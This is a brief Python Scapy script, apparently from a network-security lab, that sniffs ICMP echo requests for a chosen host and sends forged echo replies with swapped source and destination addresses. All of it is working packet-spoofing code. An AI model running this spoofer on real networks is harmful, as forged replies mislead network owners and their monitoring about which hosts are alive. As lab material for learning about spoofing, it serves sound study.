from scapy.all import *
import sys

def spoof_the_sniffed_packet(pkt):
    # Get the REQUEST ICMP only to spoof
    if ICMP in pkt and pkt[ICMP].type == 8:
        print(f"\033[0;32;40m \n\nORIGINAL PACKET")
        print(f"Source IP address:{pkt[IP].src}")
        print(f"Destination IP address: {pkt[IP].dst}")

        # Spoof the ICMP packet, make it into ECHO REPLY by swapping IP src and dst.
        a = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
        
        # ICMP request: Type = 8
        # ICMP response: Type = 0
        b = ICMP(type=0, id=pkt[ICMP].id,seq=pkt[ICMP].seq)
        
        data = pkt[Raw].load

        spoofed_pkt = a/b/data
        print(f"\033[0;31;40m \n\nSPOOFED PACKET")
        print(f"Source IP address:{spoofed_pkt[IP].src}")
        print(f"Destination IP address: {spoofed_pkt[IP].dst}")

        send(spoofed_pkt, verbose=0)

host_ip = sys.argv[1]
filter_str = 'icmp and host ' + host_ip
interfaces = ['br-00835518abdf', 'ens32']

pkt = sniff(iface=interfaces,filter=filter_str, prn=spoof_the_sniffed_packet)